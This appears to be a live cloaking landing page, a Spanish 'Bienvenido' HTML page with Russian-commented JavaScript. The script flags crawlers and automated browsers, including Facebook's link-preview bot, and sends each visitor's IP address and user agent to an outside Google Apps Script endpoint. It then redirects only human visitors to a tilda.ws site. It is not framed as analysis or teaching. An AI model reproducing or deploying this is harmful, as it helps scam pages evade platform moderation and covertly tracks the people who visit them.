<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Bienvenido</title>
</head>
<body>
  <h1 style="text-align:center;margin-top:20%;">Bienvenido</h1>

  <script>
    async function detect() {
      const ua = navigator.userAgent || '';
      const webdriver = navigator.webdriver ? '1' : '0';

      // Простой user-agent фильтр
      const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
      const isSuspiciousUA = suspiciousUAs.some(rx => rx.test(ua));

      // IP запрос
      let ip = '_';
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const json = await res.json();
        ip = json.ip;
      } catch (e) {}

      // Решение
      const isBot = webdriver === '1' || isSuspiciousUA;

      // Лог в Google Sheets
      fetch('https://script.google.com/macros/s/AKfycbwZXUvQdEOz34km7SWllpAHPupKKwR3KJ57FCSp1Rlc5x0JQeOxTrZ8paRVEAkQUjQE_A/exec', {
        method: 'POST',
        body: JSON.stringify({
          ip,
          ua,
          webdriver,
          result: isBot ? 'bot' : 'ok'
        })
      });

      // Редирект если человек
      if (!isBot) {
        setTimeout(() => {
          window.location.href = "http://argentinaforreal.tilda.ws/"; // ← сюда редирект
        }, 1500);
      }
    }

    detect();
  </script>
</body>
</html>
